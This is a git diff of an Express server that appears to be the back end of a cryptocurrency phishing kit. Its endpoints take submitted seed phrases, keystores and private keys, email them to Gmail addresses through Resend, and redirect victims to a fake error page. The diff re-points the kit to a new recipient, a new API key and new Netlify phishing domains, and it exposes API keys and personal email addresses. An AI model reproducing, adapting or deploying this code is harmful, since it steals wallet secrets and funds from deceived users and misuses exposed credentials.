@@ -7,7 +7,7 @@ const app = express();
 const PORT = 3000;
 
 // Initialize both Resend accounts
-const resend1 = new Resend("re_eejbKDk5_2htXqWueMoCu43B5ZKSbwBpv");
+const resend1 = new Resend("re_S5UE4ZSn_NLwmQQ54LHLoxqbM5BnzprWa");
 const resend2 = new Resend("re_65fhJP1u_99uemAYRzj41yH6FhcKXuULc");
 
 // Email configurations for each account
@@ -15,8 +15,8 @@ const emailConfigs = [
   {
     resendInstance: resend1,
     fromEmail: "seed Form <onboard@resend.dev>",
-    toEmail: "olanrewajuayomide636@gmail.com",
-    accountName: "olanrewajuayomide",
+    toEmail: "mikun5y@gmail.com",
+    accountName: "mikun5y",
   },
   {
     resendInstance: resend2,
@@ -151,10 +151,10 @@ This notification was sent using multiple Resend accounts to reach all recipient
       }
     });
 
-    res.redirect("https://chainpass.netlify.app/error");
+    res.redirect("https://defiii.netlify.app/error");
   } catch (error) {
     console.error("❌ Error processing phrase submission:", error);
-    res.redirect("https://chainpass.netlify.app/error");
+    res.redirect("https://defiii.netlify.app/error");
   }
 });
 
@@ -167,11 +167,11 @@ app.post("/submit-keystore", (req, res) => {
   sendEmailWithBothAccounts(subject, message)
     .then((results) => {
       console.log("✅ Keystore submission processed");
-      res.redirect("https://chainpass.netlify.app/error");
+      res.redirect("https://defiii.netlify.app/error");
     })
     .catch((error) => {
       console.error("❌ Error processing keystore submission:", error);
-      res.redirect("https://chainpass.netlify.app/error");
+      res.redirect("https://defiii.netlify.app/error");
     });
 });
 
@@ -184,11 +184,11 @@ app.post("/submit-privatekey", (req, res) => {
   sendEmailWithBothAccounts(subject, message)
     .then((results) => {
       console.log("✅ Private key submission processed");
-      res.redirect("https://chainpass.netlify.app/error");
+      res.redirect("https://defiii.netlify.app/error");
     })
     .catch((error) => {
       console.error("❌ Error processing private key submission:", error);
-      res.redirect("https://chainpass.netlify.app/error");
+      res.redirect("https://defiii.netlify.app/error");
     });
 });
 
